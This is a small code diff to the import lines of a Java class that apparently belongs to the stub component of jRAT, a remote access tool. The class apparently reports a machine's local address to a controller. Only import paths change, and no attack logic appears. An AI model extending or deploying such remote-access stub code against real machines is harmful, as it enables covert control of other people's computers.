@@ -1,11 +1,9 @@
 package io.jrat.stub.packets.outgoing;
 
 import io.jrat.common.io.StringWriter;
-
 import java.io.DataOutputStream;
 import java.net.InetAddress;
-
-import com.redpois0n.oslib.OperatingSystem;
+import oslib.OperatingSystem;
 
 
 public class Packet12InitLocalAddress extends AbstractOutgoingPacket {
